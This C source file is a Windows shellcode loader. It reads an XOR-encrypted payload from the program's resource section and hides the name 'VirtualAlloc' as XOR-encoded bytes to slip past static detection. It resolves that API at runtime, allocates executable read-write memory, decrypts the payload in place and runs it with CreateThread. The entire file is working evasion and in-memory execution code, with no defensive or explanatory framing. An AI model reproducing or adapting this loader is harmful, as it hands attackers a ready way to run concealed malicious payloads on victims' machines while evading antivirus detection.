#include <Windows.h>
#include <stdio.h>
#include "resource.h"

//pVirtualAlloc variable store the address of actual VirtualAlloc
LPVOID(WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType,  DWORD  flProtect );

// Key to use for encryption
BYTE encryptionKey = 0x5A;  // You can change this key to any byte value

// Function to XOR encrypt a payload with a single byte key
void XorByOneKey(BYTE* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
	for (SIZE_T i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ bKey;
		//printf("pShellcode : %s \n", pShellcode);
	}
}

int main() {


// add null terminator end of the xorTest.c output 
char sVirtualAlloc[] = { 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x00 };


HRSRC		hRsrc = NULL;
HGLOBAL		hGlobal = NULL;
PVOID		pPayloadAddress = NULL;
SIZE_T		sPayloadSize = NULL;


// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
if (hRsrc == NULL) {
	// in case of function failure
	printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
	return -1;
}

// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
hGlobal = LoadResource(NULL, hRsrc);
if (hGlobal == NULL) {
	// in case of function failure
	printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
	return -1;
}

// Get the address of our payload in .rsrc section
pPayloadAddress = LockResource(hGlobal);
if (pPayloadAddress == NULL) {
	// in case of function failure
	printf("[!] LockResource Failed With Error : %d \n", GetLastError());
	return -1;
}

// Get the size of our payload in .rsrc section
sPayloadSize = SizeofResource(NULL, hRsrc);
if (sPayloadSize == NULL) {
	// in case of function failure
	printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
	return -1;
}

// Printing pointer and size to the screen
printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);
printf("[i] sPayloadSize var : %ld \n", sPayloadSize);

// Encrypt the payload
printf("size of %d \n", sizeof(sVirtualAlloc));

XorByOneKey(sVirtualAlloc, sizeof(sVirtualAlloc)-1, encryptionKey);

printf("Original Payload: %s\n", sVirtualAlloc);

pVirtualAlloc = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), sVirtualAlloc);

// Allocating executable memory using VirtualAlloc
PVOID pExecBuffer = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (pExecBuffer == NULL) {
    // in case of function failure
    //printf("[!] pVirtualAlloc Failed With Error : %d \n", GetLastError());
    return -1;
}

// Copying the payload from resource section to the executable buffer
memcpy(pExecBuffer, pPayloadAddress, sPayloadSize);

// Printing the base address of our buffer (pExecBuffer)
printf("[i] pExecBuffer var : 0x%p \n", pExecBuffer);

// Encrypt the payload
XorByOneKey(pExecBuffer, sPayloadSize, encryptionKey);

// Create a thread to execute the payload
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecBuffer, NULL, 0, NULL);
if (hThread == NULL) {
    // in case of function failure
    printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
    return -1;
}

// Wait for the thread to finish execution
WaitForSingleObject(hThread, INFINITE);

// Close the thread handle
CloseHandle(hThread);

// Free the allocated memory
VirtualFree(pExecBuffer, 0, MEM_RELEASE);

getchar();
return 0;
}